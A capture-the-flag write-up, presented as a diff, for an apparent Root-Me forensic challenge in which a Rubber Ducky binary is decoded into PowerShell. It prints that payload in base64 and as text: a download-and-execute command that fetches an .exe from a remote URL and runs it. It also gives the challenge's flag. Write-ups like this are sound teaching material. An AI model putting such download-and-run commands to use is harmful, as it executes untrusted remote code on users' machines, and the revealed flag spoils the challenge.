@@ -1,0 +1,21 @@
+Download and unzip the file and you will get "file.bin".
+
+Since I have never known about the rubber ducky USB drive. So it was not obvious for me to look in that direction. 
+After banging my head over that "file.bin" for like 2 days I got to know about ducky USB. 
+
+Take the bin and decode it in https://ducktoolkit.com/decoder/ and you will get a encoded powershell code along with "You’re hacked picture".
+
+Base64: 
+
+aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AA
+aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoA
+
+Text: 
+
+iex (New-ObjectSystem.Net.WebClient).DownloadFile('http://challenge01.rootme.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe'); 
+iex (New-Object -com shell.application).shellexecute('666c61676765643f.exe');
+
+Go to the link http://challenge01.rootme.org/forensic/ch14/files/666c61676765643f.exe and a ".EXE" file will be downloaded.
+The code is in assembly language so disassembel it  in https://onlinedisassembler.com/ and will get a flag Flag:RubberDuckyFail3D
+
+#RubberDuckyFail3D
